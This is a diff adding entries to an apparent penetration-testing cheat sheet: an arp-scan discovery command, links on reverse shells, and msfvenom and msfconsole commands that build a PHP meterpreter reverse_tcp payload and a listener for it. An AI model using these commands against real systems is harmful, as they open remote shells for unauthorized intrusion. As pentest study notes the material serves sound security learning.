@@ -8,6 +8,10 @@ find out the ip of the machine in the network
 
     netdiscover -r 192.168.134.0/24
 
+*ARP Scan*
+
+    arp-scan --local
+
 **Find ports**
 
 *SSH fast UDP*
@@ -897,6 +901,36 @@ Make files downloadable
 *Priviledge Check*
 
 https://github.com/GammaG/linuxprivchecker
+
+
+*Create Reverse Shell*
+
+https://netsec.ws/?p=331
+
+
+**Set up Meterpreter session**
+
+https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit
+
+*Generate the payload*
+
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 EXITFUNC=thread -f raw > shell.php
+
+*Meterpreter Session*
+
+    ./msfconsole -q
+    msf > use exploit/multi/handler
+    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+    payload => windows/meterpreter/reverse_tcp
+    msf exploit(handler) > set lhost 192.168.1.123
+    lhost => 192.168.1.123
+    msf exploit(handler) > set lport 4444
+    lport => 4444
+    msf exploit(handler) > run
+
+    shell - to get normal shell
+
+
 
 
 
